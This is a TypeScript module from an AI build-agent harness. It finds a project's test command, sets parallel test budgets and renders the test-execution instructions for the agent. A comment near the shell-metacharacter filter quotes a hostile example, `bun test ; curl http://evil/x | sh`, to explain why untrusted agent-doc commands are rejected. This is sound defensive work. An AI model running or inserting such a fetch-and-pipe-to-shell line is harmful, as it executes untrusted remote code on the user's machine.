/**
 * @neutronai/trident — the TEST EXECUTION strategy the build contracts carry.
 *
 * WHAT THIS SOLVES. `scripts/run-tests.sh` has shipped chunked parallelism since
 * T0 (`NEUTRON_TEST_JOBS`, default `1` = sequential, plus `NEUTRON_TEST_CHUNK_SIZE`
 * and the fatal declared/discovered/assigned/executed coverage audit). The BUILD
 * side has never asked for it: the live Forge contract says only "run the relevant
 * tests… iterate until green", so 1,273 files run one chunk after another, ~20
 * minutes, re-paid on every fix round. This module derives the missing instruction.
 *
 * WHY IT IS TS AND NOT INLINE IN THE WORKFLOW. Same reason as
 * `buildReflectionGuidance` (`trident/reflection-guidance.ts`):
 * `trident/inner-workflow.mjs` is a Workflow script with no module resolution, so
 * anything it needs must arrive as an ALREADY-RENDERED string arg. Deriving it here
 * is what makes it unit-testable at all.
 *
 * WHY EVERYTHING IS DISCOVERED, NOTHING HARDCODED. Trident deploys to every project
 * (enterprise runs this same code from `/opt/neutron-managed/vendor/neutron/trident/`).
 * `NEUTRON_TEST_JOBS` and `scripts/run-tests.sh` are neutron-open's OWN runner; a
 * different repo has a different command and probably no knobs at all. So: discover
 * the command, probe the knobs statically, and degrade HONESTLY — a project without
 * knobs runs its suite unchanged and sequentially with one log line, never an error.
 * A throughput optimisation that breaks a project it does not understand is a
 * regression.
 *
 * THE ONE THING EVERY READER GETS WRONG. The rendered block is FROZEN into a prompt
 * string at launch and reused for round 1 and every fix round afterwards. So no value
 * in it may depend on a quantity that changes after launch — which is exactly why the
 * jobs budget divides by a CONSTANT fan-out and not by the live run count. See
 * `computeTestJobs`.
 *
 * CONTRACT OF THIS MODULE: pure-ish (reads files, writes nothing), NEVER throws into
 * a launch path, NEVER spawns a process anywhere, and has NO import-time side
 * effects. A build must never fail because the strategy could not be derived.
 */

import { readFileSync, statSync } from 'node:fs'
import * as os from 'node:os'
import { isAbsolute, resolve } from 'node:path'

// ─────────────────────────────────────────────────────────────────────────────
// 1. Discover the project's test command
// ─────────────────────────────────────────────────────────────────────────────

export interface TestCommandResolution {
  /** e.g. `bash scripts/run-tests.sh`. `null` = could not be resolved. */
  command: string | null
  source: 'package-json' | 'agent-docs' | null
}

const UNRESOLVED: TestCommandResolution = { command: null, source: null }

/**
 * Agent-doc files scanned, in order, when `package.json` cannot answer. These are
 * the conventional places a repo writes down how to run its tests for an agent.
 */
const AGENT_DOC_FILES = ['CLAUDE.md', 'AGENTS.md', 'CONTRIBUTING.md'] as const

/**
 * Known test invocations. Deliberately a CLOSED list: an agent doc's fenced blocks
 * are full of arbitrary shell, and the failure mode of a loose pattern is the build
 * being told to run some unrelated (possibly destructive) command. Anything not
 * recognised falls through to the honest "unresolved" branch, where the agent is
 * told to read the project's docs itself.
 */
const TEST_INVOCATION =
  /^(?:\$\s*)?((?:bash|sh)\s+\S+\.sh|bun\s+test\b.*|(?:npm|pnpm|yarn)\s+(?:run\s+)?test\b.*|pytest\b.*|go\s+test\b.*|cargo\s+test\b.*)$/

/**
 * The other half of the closed list. Every alternative above ends in `.*` so that a
 * real invocation's flags survive (`bun test --bail`, `pytest -q tests/`), and `.*`
 * on its own would happily carry `bun test ; curl http://evil/x | sh` — a recognised
 * PREFIX followed by arbitrary shell, rendered to the build under "run exactly this".
 * A recognised prefix is not a recognised command, so anything that could chain,
 * substitute or redirect disqualifies the whole line and we fall through to the next
 * candidate (and ultimately to the honest "unresolved" branch).
 *
 * Applies to AGENT DOCS ONLY. `package.json` `scripts.test` is the project's own
 * declared entry point, where `tsc && bun test` is both normal and correct.
 */
const SHELL_METACHARACTERS = /[;&|`$(){}<>\\\n]/

function hasShellMetacharacters(command: string): boolean {
  return SHELL_METACHARACTERS.test(command)
}

/**
 * An agent doc's fenced blocks are mostly EXAMPLES, and the commonest example of all is
 * "run one file": `bun test packages/api/src/one.test.ts`. That line matches
 * `TEST_INVOCATION` perfectly, and `firstFencedTestInvocation` takes the FIRST match —
 * so a doc that shows the one-file form before its `make test-all` would have handed the
 * build a SINGLE FILE under "Full suite (stage 2), run exactly this", and the full-suite
 * gate would then have accepted `testsPassed=true` from a one-file run. That is exactly
 * the defect this card says it must not introduce, reachable on the PART-2 path (a repo
 * whose `package.json` has no usable `scripts.test`).
 *
 * So a candidate that names a concrete TEST FILE is not the project's suite, whatever
 * else it looks like: skip it and keep reading. Applies to agent docs only — tier 1 is
 * the project's own declared entry point and is never an example.
 */
const NAMES_A_TEST_FILE = /(?:^|\s)\S*\.(?:test|spec)\.[cm]?[jt]sx?(?:\s|$)/

function namesATestFile(command: string): boolean {
  return NAMES_A_TEST_FILE.test(command)
}

/**
 * `npm init` writes `"test": "echo \"Error: no test specified\" && exit 1"` and most
 * repos never delete it. Splicing that verbatim under "Full suite (stage 2), run
 * exactly this" hands the build a guaranteed-red command it is then told to iterate
 * until green — a project with no tests must still BUILD (PART 2 §3), so the
 * placeholder is treated as "no test script declared" and falls through to the agent
 * docs, then to the honest unresolved branch.
 */
const PLACEHOLDER_TEST_SCRIPT = /no test specified/i

function isPlaceholderTestScript(script: string): boolean {
  return PLACEHOLDER_TEST_SCRIPT.test(script)
}

function readTextOrNull(path: string, maxBytes = 1024 * 1024): string | null {
  try {
    const stat = statSync(path)
    if (!stat.isFile() || stat.size > maxBytes) return null
    return readFileSync(path, 'utf8')
  } catch {
    return null
  }
}

/**
 * Tier 1 `package.json` `scripts.test`; tier 2 the repo's agent docs. Never throws:
 * a missing/malformed `package.json` falls through to tier 2, and a repo that says
 * nothing anywhere yields `{ command: null, source: null }`.
 */
export function resolveTestCommand(repoRoot: string): TestCommandResolution {
  try {
    // Tier 1 — the project's own declared test script.
    const pkgText = readTextOrNull(resolve(repoRoot, 'package.json'))
    if (pkgText !== null) {
      try {
        const pkg = JSON.parse(pkgText) as { scripts?: { test?: unknown } }
        const declared = pkg?.scripts?.test
        if (typeof declared === 'string' && declared.trim().length > 0 && !isPlaceholderTestScript(declared)) {
          return { command: declared.trim(), source: 'package-json' }
        }
      } catch {
        // Malformed JSON is not fatal — fall through to the agent docs.
      }
    }

    // Tier 2 — the first known test invocation inside a fenced code block.
    for (const file of AGENT_DOC_FILES) {
      const text = readTextOrNull(resolve(repoRoot, file))
      if (text === null) continue
      const found = firstFencedTestInvocation(text)
      if (found !== null) return { command: found, source: 'agent-docs' }
    }
    return UNRESOLVED
  } catch {
    return UNRESOLVED
  }
}

/** First recognised test invocation on a line INSIDE a ``` fenced block. */
function firstFencedTestInvocation(markdown: string): string | null {
  let inFence = false
  for (const raw of markdown.split('\n')) {
    const line = raw.trim()
    if (line.startsWith('```')) {
      inFence = !inFence
      continue
    }
    if (!inFence) continue
    const match = TEST_INVOCATION.exec(line)
    const candidate = match?.[1]?.trim()
    if (
      candidate !== undefined &&
      candidate.length > 0 &&
      !hasShellMetacharacters(candidate) &&
      !namesATestFile(candidate)
    )
      return candidate
  }
  return null
}

// ─────────────────────────────────────────────────────────────────────────────
// 2. Probe the resolved runner for parallel knobs — STATICALLY
// ─────────────────────────────────────────────────────────────────────────────

export interface ParallelKnobs {
  /** `'NEUTRON_TEST_JOBS'` when the runner is known to honour it, else null. */
  jobs_env: string | null
  /** `'NEUTRON_TEST_CONCURRENCY'` when the runner is known to honour it, else null. */
  concurrency_env: string | null
  /** Repo-relative (or absolute) script file whose text was scanned, or null. */
  probed_file: string | null
  /**
   * The COMMAND STRING itself already assigns one of the knobs — the project has
   * PINNED it (`"test": "NEUTRON_TEST_JOBS=1 bash scripts/run-tests.sh"`). Prefixing
   * our own assignment in front of that is silently discarded: in `A=1 A=2 cmd` the
   * LAST assignment wins, so the budget would evaporate while the block claimed to
   * have set it. A pinned knob is reported honestly and left alone.
   */
  pinned_by_command: boolean
}

const NO_KNOBS: ParallelKnobs = {
  jobs_env: null,
  concurrency_env: null,
  probed_file: null,
  pinned_by_command: false,
}

const JOBS_ENV = 'NEUTRON_TEST_JOBS'
const CONCURRENCY_ENV = 'NEUTRON_TEST_CONCURRENCY'

/**
 * JUDGMENT CALL, deliberate: this probe is a STATIC TEXT SCAN and nothing else. The
 * obvious alternative — run the resolved command with `--help` and read its header —
 * is not safe here, because the command belongs to a project trident has never seen.
 * A runner that ignores `--help` would execute the WHOLE SUITE (or worse, a script
 * with side effects) just to answer "do you support parallelism?". So we read the
 * command string and, if it names a script file, that file's text. Nothing in this
 * module ever spawns a process.
 *
 * Scanned: (a) the command string; (b) the first whitespace token ending in
 * `.sh|.mjs|.js|.ts` that resolves (relative to `repoRoot`, or absolute) to an
 * existing file ≤ 1 MiB.
 *
 * An assignment of either knob INSIDE the command string is not "support", it is a
 * PIN: the project chose that value, and a prefix in front of it loses to it anyway.
 * That case reports `pinned_by_command` and no usable knob.
 */
export function probeParallelKnobs(repoRoot: string, command: string | null): ParallelKnobs {
  try {
    if (typeof command !== 'string' || command.trim().length === 0) return NO_KNOBS

    let probed_file: string | null = null
    let scriptText: string | null = null
    for (const token of command.trim().split(/\s+/)) {
      if (!/\.(sh|mjs|js|ts)$/.test(token)) continue
      const path = isAbsolute(token) ? token : resolve(repoRoot, token)
      const text = readTextOrNull(path)
      if (text === null) continue
      probed_file = token
      scriptText = text
      break
    }

    const pinned_by_command = assignsEnv(command, JOBS_ENV) || assignsEnv(command, CONCURRENCY_ENV)
    if (pinned_by_command) return { jobs_env: null, concurrency_env: null, probed_file, pinned_by_command }

    return {
      jobs_env: honours(command, scriptText, JOBS_ENV) ? JOBS_ENV : null,
      concurrency_env: honours(command, scriptText, CONCURRENCY_ENV) ? CONCURRENCY_ENV : null,
      probed_file,
      pinned_by_command,
    }
  } catch {
    return NO_KNOBS
  }
}

/** `NAME=` anywhere in the command string — an env assignment the project made itself. */
function assignsEnv(command: string, name: string): boolean {
  return new RegExp(`\\b${name}\\s*=`).test(command)
}

function honours(command: string, scriptText: string | null, name: string): boolean {
  const pattern = new RegExp(`\\b${name}\\b`)
  return pattern.test(command) || (scriptText !== null && pattern.test(scriptText))
}

// ─────────────────────────────────────────────────────────────────────────────
// 3. The concurrency-aware jobs budget
// ─────────────────────────────────────────────────────────────────────────────

export interface TestJobsInput {
  cores: number
  /** Runs ACTUALLY IN A BUILD PHASE, including this one — the live test-running fan-out. */
  active_runs: number
  mem_available_bytes: number
  /** The runner's `NEUTRON_TEST_CHUNK_SIZE` default. */
  chunk_size?: number
  /** Conservative per-file working set. See `DEFAULT_PER_FILE_RSS`. */
  per_file_rss_bytes?: number
  /** The planned box-wide fan-out. See `DEFAULT_BUILD_FANOUT`. */
  fanout?: number
}

const DEFAULT_CHUNK_SIZE = 100
/**
 * A deliberately CONSERVATIVE per-file working set. `docs/testing-runner.md` measures
 * ~1 MiB/file for the discovery+module graph and documents that a single process
 * passes ~1.2 GB RSS on the whole suite; this constant is not that measurement, it is
 * a 24× safety factor over it so the RAM term errs toward fewer jobs. On the reference
 * box the term is INERT (25 GiB × 0.8 ÷ (100 × 24 MiB) = 8, equal to the core term):
 * it binds only on a small or heavily-loaded box, which is exactly when it should.
 */
const DEFAULT_PER_FILE_RSS = 24 * 2 ** 20 // 24 MiB
/** Leave a fifth of available RAM for everything else on a shared box. */
const MEM_HEADROOM = 0.8

/**
 * THE DIVISOR IS A CONSTANT, NOT THE LIVE COUNT — and that is the whole point.
 *
 * The obvious design (divide the cores by however many runs are live RIGHT NOW) is
 * wrong here, and was shipped wrong in the first round of this change: the value is
 * rendered into a PROMPT STRING at launch and then frozen for the whole run, round 1
 * and every fix round. Runs do not launch simultaneously. Run 1 launches alone, sees
 * 1, and keeps `JOBS = cores` for the next hour; run 2 launches, sees 2, takes
 * `cores/2`; run 3 takes `cores/3`. The aggregate on an 8-core box is 8+4+2 = 14 chunk
 * processes, worse than the oversubscription the division existed to prevent.
 *
 * A constant divisor is stale-proof BY CONSTRUCTION: every run — whenever it launched,
 * and however long its string has been frozen — asks for `cores / FANOUT`, so as long
 * as at most FANOUT builds are in flight the sum is at most `cores`. The live count is
 * kept only as a RAISE-ONLY term (`max(fanout, active_runs)`): beyond FANOUT builds
 * the later launches shrink further, which is a degradation and not a guarantee — with
 * more than FANOUT concurrent builds the earlier frozen grants DO oversubscribe, and
 * saying so is the honest statement of what this arithmetic buys.
 *
 * 4 is the card's own worked example ("four concurrent builds each asking for JOBS=4
 * is sixteen bun processes on eight cores") and matches the observed trident fan-out.
 */
export const DEFAULT_BUILD_FANOUT = 4

/**
 * Split the box across the PLANNED fan-out, then cap by RAM.
 *
 * Reference box (8 cores, 25 GiB available, defaults → the memory term allows 8):
 *
 *   divisor = max(FANOUT, active_runs) │ 1 │ 2 │ 4 │ 8+ │
 *   jobs                               │ 8 │ 4 │ 2 │  1 │
 *
 * With the shipped `FANOUT = 4` the divisor is never below 4, so this box budgets
 * `JOBS=2` per build and 4 concurrent builds total 8 chunk processes on 8 cores.
 * (These numbers go verbatim into AS_BUILT.) Any unusable input degrades to 1 —
 * sequential, i.e. exactly the runner's own default, which is always safe.
 *
 * BOTH TERMS DIVIDE BY THE FAN-OUT. The core term always did; the memory term did not,
 * and a per-build RAM cap is not an aggregate one — `{cores:32, mem:16 GiB}` budgeted 5
 * jobs per build, i.e. a claimed 48 GiB across a 4-way fan-out against 16 GiB available.
 * RAM is shared by the same builds the cores are, so it is shared by the same divisor.
 * On the reference box the memory term is INERT either way (8.3/divisor vs 8/divisor),
 * which is why the table above is unchanged.
 */
export function computeTestJobs(input: TestJobsInput): number {
  const chunkSize = positiveOr(input.chunk_size, DEFAULT_CHUNK_SIZE)
  const perFileRss = positiveOr(input.per_file_rss_bytes, DEFAULT_PER_FILE_RSS)
  const fanout = positiveOr(input.fanout, DEFAULT_BUILD_FANOUT)
  if (!isPositive(input.cores) || !isPositive(input.mem_available_bytes)) return 1

  const divisor = Math.max(1, Math.floor(Math.max(fanout, isPositive(input.active_runs) ? input.active_runs : 1)))
  const byCores = Math.max(1, Math.floor(input.cores / divisor))
  const byMem = Math.max(1, Math.floor((input.mem_available_bytes * MEM_HEADROOM) / (divisor * chunkSize * perFileRss)))
  return Math.min(byCores, byMem)
}

/**
 * The in-process interleaving budget that goes with `jobs`.
 *
 * The runner's `NEUTRON_TEST_CONCURRENCY` default is the box's PHYSICAL CORE COUNT,
 * chosen for the sequential default where there is exactly one chunk process. Raising
 * `JOBS` without touching it multiplies: the first measured parallel run of this card
 * was `jobs=8 max-concurrency=8` — 64 test files interleaving on 8 cores — and it
 * showed up as +28% summed process time (1311 s → 1673 s) against a 1.97× wall-clock
 * win. So the two are budgeted TOGETHER: `cores / jobs`, i.e. this build's chunk
 * processes get one core's worth of interleaving each, and `jobs × concurrency` is
 * `cores` per build instead of `cores²`. `jobs = 1` reproduces the runner's own
 * default exactly, so a knob-less or sequential path is unchanged.
 */
export function computeTestConcurrency(cores: number, jobs: number): number {
  if (!isPositive(cores) || !isPositive(jobs)) return 1
  // `Math.max(1, …)` on the DIVISOR, not just the result: `isPositive` admits 0.5, and
  // `floor(0.5)` is 0, so a fractional jobs count divided straight through returned
  // Infinity. Unreachable through `buildTestStrategy` (`computeTestJobs` only ever
  // returns integers ≥ 1) and guarded again downstream, but a helper that answers
  // Infinity is a trap for the next caller.
  return Math.max(1, Math.floor(cores / Math.max(1, Math.floor(jobs))))
}

export interface HostBudget {
  /** Usable CPUs, always an integer ≥ 1. */
  cores: number
  /** Available (not merely free) RAM in BYTES; `0` when it cannot be determined. */
  mem_available_bytes: number
}

/** Where Linux publishes `MemAvailable`, in kB. */
const MEMINFO_PATH = '/proc/meminfo'
const MEM_AVAILABLE = /^MemAvailable:\s+(\d+)\s*kB/m

/**
 * The box's live capacity, read for `computeTestJobs`. Same contract as the rest of
 * this module: NEVER throws and NEVER spawns — every probe is wrapped, and each
 * failure falls to the next-weakest source rather than propagating.
 *
 * `cores`: `os.availableParallelism()` (which honours a cgroup/affinity limit, so a
 * container gets its real share rather than the host's), falling back to
 * `os.cpus().length`, then to 1.
 *
 * `mem_available_bytes`: `MemAvailable` from `/proc/meminfo` × 1024 — NOT `freemem()`,
 * which counts only unallocated pages and so reads a healthy page-cached box as nearly
 * out of memory. On any failure (unreadable, no match, non-positive — e.g. macOS, where
 * there is no procfs) it falls back to `os.freemem()`, and to `0` if even that fails.
 * Zero is a safe answer, not a broken one: `computeTestJobs` returns 1 (sequential, the
 * runner's own default) for a non-positive memory figure.
 *
 * `readFile` is injected only so tests can drive the fixture and the failure paths.
 */
export function readHostBudget(readFile?: (path: string) => string): HostBudget {
  let cores = 1
  try {
    const parallelism = os.availableParallelism?.()
    if (isPositive(parallelism)) cores = Math.floor(parallelism)
    else {
      const cpuCount = os.cpus()?.length
      if (isPositive(cpuCount)) cores = Math.floor(cpuCount)
    }
  } catch {
    cores = 1
  }

  let mem_available_bytes = 0
  try {
    const read = readFile ?? ((path: string) => readFileSync(path, 'utf8'))
    const match = MEM_AVAILABLE.exec(read(MEMINFO_PATH))
    const kb = match ? Number(match[1]) : Number.NaN
    if (isPositive(kb)) mem_available_bytes = kb * 1024
  } catch {
    mem_available_bytes = 0
  }
  if (!isPositive(mem_available_bytes)) {
    try {
      const free = os.freemem()
      mem_available_bytes = isPositive(free) ? free : 0
    } catch {
      mem_available_bytes = 0
    }
  }

  return { cores: Math.max(1, cores), mem_available_bytes }
}

function isPositive(value: unknown): value is number {
  return typeof value === 'number' && Number.isFinite(value) && value > 0
}

function positiveOr(value: unknown, fallback: number): number {
  return isPositive(value) ? value : fallback
}

// ─────────────────────────────────────────────────────────────────────────────
// 4. Render the TEST EXECUTION prompt block
// ─────────────────────────────────────────────────────────────────────────────

export interface TestStrategyInput {
  resolution: TestCommandResolution
  knobs: ParallelKnobs
  jobs: number
  /** The in-process interleaving budget that goes with `jobs`. Absent → not set. */
  concurrency?: number
  base_branch: string
}

/**
 * The one line a knob-less project gets. It is a LOG LINE, not an error: the suite
 * still runs, unchanged and sequential. Exact text is pinned by a test because it is
 * the honest-degradation proof point for PART 2 (enterprise).
 */
export const NO_KNOBS_LINE = 'parallel knobs not found in the project test runner — running it unchanged (sequential)'

/**
 * The project assigns the knob itself, so we leave it alone. Also a LOG LINE, not an
 * error, and for the same reason: a prefixed assignment would lose to the project's own
 * and the block would be CLAIMING a budget it did not set.
 */
export const PINNED_KNOBS_LINE =
  'the project pins its own parallelism in the test command — running it unchanged, budget not applied'

/**
 * The unresolved branch used to end on `NO_KNOBS_LINE`, which says the knobs were not
 * found "in the project test runner" — a claim about a runner this branch has just said
 * it could not identify. Nothing was probed, so nothing can be reported about it.
 */
export const UNRESOLVED_COMMAND_LINE =
  'project test command not resolved — no runner was probed, so no parallelism budget is applied (sequential)'

/**
 * The runner takes the jobs knob but exposes no per-process concurrency knob, so the
 * pairing that keeps `jobs × concurrency` at `cores` cannot be completed: the runner
 * keeps its own default (commonly the core count), and the product is `jobs × cores`.
 * The budget is still applied — sequential is the worse answer — but the block SAYS so
 * rather than implying a bound it did not set.
 */
export const UNPAIRED_CONCURRENCY_LINE =
  'this runner exposes no per-process concurrency knob, so its own default is left in place — the jobs budget above is the only bound set here'

/** Stage 1 must never grow into an un-chunked whole-suite run. See `renderTestStrategy`. */
export const STAGE_1_FILE_CAP = 40

/** Stage 1 exists to REJECT early. Pinned verbatim: this is the defect guard. */
export const STAGE_1_REJECT_ONLY = 'Stage 1 can only reject early; it can never approve.'

/** Acceptance criterion 5's proof point. Pinned verbatim. */
export const FULL_SUITE_REQUIRED =
  "You may NOT report testsPassed=true on a stage-1 pass alone — testsPassed=true requires the FULL suite run to complete and pass, including the runner's own coverage-audit/summary line in your log tail."

/** Acceptance criterion 7's resolution: the `timeout 590` wrapper is banned. */
export const NO_TIMEOUT_WRAPPER =
  'Do NOT wrap the suite in a timeout wrapper (a 590 s cap has killed complete runs mid-flight and read them as failures). Start the full suite in the background redirected to a log file and poll the log tail until the runner prints its final summary line; budget up to 40 minutes before declaring a hang.'

export function renderTestStrategy(input: TestStrategyInput): string {
  const { resolution, knobs, jobs, base_branch } = input
  const command = typeof resolution?.command === 'string' && resolution.command.trim().length > 0 ? resolution.command.trim() : null
  const hasKnob = command !== null && typeof knobs?.jobs_env === 'string' && knobs.jobs_env.length > 0
  const baseBranch = typeof base_branch === 'string' && base_branch.trim().length > 0 ? base_branch.trim() : 'main'
  const jobCount = isPositive(jobs) ? Math.floor(jobs) : 1
  const concurrency = isPositive(input.concurrency) ? Math.floor(input.concurrency) : null

  const commandLines: string[] = []
  if (command === null) {
    commandLines.push(
      'The project test command could NOT be resolved from its package.json or agent docs.',
      "Resolve it yourself from the project's own documentation (README / CLAUDE.md / AGENTS.md /",
      'CONTRIBUTING.md / package.json) and then run it UNCHANGED — do not invent flags, do not',
      'substitute a narrower command, and do not add environment variables it does not document.',
      UNRESOLVED_COMMAND_LINE,
    )
  } else if (hasKnob) {
    // EXPORTS ON THEIR OWN LINES, NOT A `VAR=v cmd` PREFIX. A one-command prefix reaches
    // only the FIRST command of a compound test script (`tsc && bun test` — verified: the
    // second command sees nothing), and the knob would be silently discarded on exactly
    // the projects whose scripts.test does more than one thing.
    commandLines.push(
      'Full suite (stage 2), run exactly this — the export lines FIRST, on their own lines, so a',
      'compound test command inherits them:',
      '',
      `  export ${knobs.jobs_env}=${jobCount}`,
      ...(concurrency !== null && typeof knobs.concurrency_env === 'string'
        ? [`  export ${knobs.concurrency_env}=${concurrency}`]
        : []),
      `  ${command}`,
      '',
      `The runner honours ${knobs.jobs_env} (found by static scan${knobs.probed_file ? ` of ${knobs.probed_file}` : ''}). The value`,
      "above is this box's core/RAM budget divided across trident's planned build fan-out — do NOT",
      'raise it; other builds are sharing these cores. Everything else about the command stays as',
      'the project wrote it.',
      ...(concurrency !== null && typeof knobs.concurrency_env === 'string' ? [] : [UNPAIRED_CONCURRENCY_LINE]),
    )
  } else if (knobs?.pinned_by_command === true) {
    commandLines.push('Full suite (stage 2), run exactly this:', '', `  ${command}`, '', PINNED_KNOBS_LINE)
  } else {
    commandLines.push(
      'Full suite (stage 2), run exactly this:',
      '',
      `  ${command}`,
      '',
      NO_KNOBS_LINE,
    )
  }

  return [
    'TEST EXECUTION',
    '',
    ...commandLines,
    '',
    'STAGE 1 — fail fast (minutes, not tens of minutes).',
    // THE DIFF RANGE IS base..WORKING TREE, NOT base..HEAD. Step 3 runs the tests and
    // step 4 commits, so at stage-1 time there is usually NOTHING committed yet and
    // `base..HEAD` prints an empty list (on a fix round it prints the PREVIOUS round's
    // files, which is worse than empty). `git diff --name-only <base>` compares the base
    // against the WORKING TREE; the second command catches files git has never seen.
    `After your edits, list what you changed — WORKING TREE included, because you have not`,
    `committed yet: \`git diff --name-only ${baseBranch}\` plus \`git ls-files --others --exclude-standard\`.`,
    'The stage-1 set is: (a) the changed files that are themselves test files, (b) the test files',
    "in each changed file's own directory or its adjacent `__tests__/`, and (c) test files that",
    "name a changed module's basename (`grep -l <basename> <test files>`).",
    // THE CAP BOUNDS THE WHOLE SET, and the first version of this block got that wrong:
    // it capped tier (c) only, so (a)+(b) were unbounded — 54 files for a one-file edit,
    // 589 (46% of the suite) for this card's own diff, and GROWING every fix round,
    // because `git diff --name-only <base>` is the branch's CUMULATIVE diff, not this
    // round's. Stage 1 that costs ten minutes is not fail-fast; it is the full suite
    // wearing a hat. Tier (c) on a generic basename ("index", "store", "utils") is the
    // worst offender, so it is still the first tier dropped, but the budget is now the
    // TOTAL. A file-scoped invocation is also ONE un-chunked process, which is the
    // single-process OOM and the cross-file lane contamination the project's own chunked
    // runner exists to prevent. Stage 1 is a fast REJECT, so it is allowed to be
    // incomplete; stage 2 is the authority, and it runs everything.
    `Bound the WHOLE stage-1 set at ${STAGE_1_FILE_CAP} files, in priority order: take (a), then add (b), then`,
    `add (c), stopping at ${STAGE_1_FILE_CAP} — DROP (c) entirely rather than trimming it, then drop (b) the`,
    `same way, and if (a) alone is over budget run its first ${STAGE_1_FILE_CAP} files. On a fix round that`,
    "diff is the branch's CUMULATIVE one, so prefer the files THIS round touched when the cap",
    'forces a choice. Run the set in batches of at most 20 per invocation. Stage 1 is a fast',
    'reject and is ALLOWED to be incomplete.',
    "Run that set with the project's file-scoped test invocation (e.g. `bun test <file> …`). A",
    'stage-1 failure is fixed IMMEDIATELY, before anything else — do not start the full suite on a',
    `red stage 1. ${STAGE_1_REJECT_ONLY}`,
    'A file-scoped run does NOT reproduce the isolation lanes the project runner sets up, so a',
    'stage-1 red your own diff cannot explain is NOT chased here — leave it to stage 2, which runs',
    'the suite the way the project intends.',
    '',
    'STAGE 2 — the full suite, REQUIRED.',
    `${FULL_SUITE_REQUIRED}`,
    'A green stage 1 buys you nothing except the right to start stage 2.',
    '',
    'TIMEOUT.',
    NO_TIMEOUT_WRAPPER,
    '',
    'Keep the redirect discipline for both stages: send stdout+stderr to a log file and read only',
    'the tail — never let raw test output flood your context.',
  ].join('\n')
}

// ─────────────────────────────────────────────────────────────────────────────
// 5. Composition — the one function the launcher calls
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Discover → probe → budget → render, in one never-throwing call. Any fs/parse
 * failure (including a `repoRoot` that does not exist) still yields a usable block:
 * the unresolved-command branch, which tells the agent to read the project's docs
 * and run its suite unchanged. A build is never blocked by this derivation.
 */
export function buildTestStrategy(
  repoRoot: string,
  env: { cores: number; active_runs: number; mem_available_bytes: number; base_branch: string },
): string {
  try {
    const resolution = resolveTestCommand(repoRoot)
    const knobs = probeParallelKnobs(repoRoot, resolution.command)
    const jobs = computeTestJobs({
      cores: env?.cores,
      active_runs: env?.active_runs,
      mem_available_bytes: env?.mem_available_bytes,
    })
    const concurrency = computeTestConcurrency(env?.cores, jobs)
    return renderTestStrategy({ resolution, knobs, jobs, concurrency, base_branch: env?.base_branch })
  } catch {
    return renderTestStrategy({
      resolution: UNRESOLVED,
      knobs: NO_KNOBS,
      jobs: 1,
      base_branch: typeof env?.base_branch === 'string' ? env.base_branch : 'main',
    })
  }
}
